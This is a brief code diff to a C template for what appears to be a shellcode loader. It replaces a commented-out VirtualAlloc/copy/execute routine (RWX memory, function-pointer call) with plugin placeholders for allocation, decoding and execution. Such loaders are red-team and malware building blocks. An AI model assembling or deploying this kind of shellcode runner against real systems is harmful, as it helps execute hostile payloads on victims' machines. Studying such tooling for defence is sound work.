@@ -16,31 +16,19 @@ int main()
 		return 6;
 	}
 
-
+	// Allocate RWX segment
     // char *dest = ...
     {{ plugin_allocator }}
 
-    // dest[] = supermega_payload[]
-    // len: 0x11223344
+	// Copy
+	// from: supermega_payload[]
+	// to:   dest[]
+    // len:  0x11223344
     {{ plugin_decoder }}
 
-    // dest[]
+    // Execute *dest
     {{ plugin_executor }}
 
-    /*
-
-	// Copy shellcode
-	// ntdll.dll: VirtualAlloc()
-	char *dest = VirtualAlloc(NULL, 4096, 0x3000, 0x40);
-	// 11223344 is a magic number which will be replaced in the asm source
-	// with the payload length.
-	for(int n=0; n<11223344; n++) {
-		dest[n] = supermega_payload[n];
-	}
-
-	// Exec shellcode
-	 (*(void(*)())(dest))();
-*/
 	return 0;
 }
 
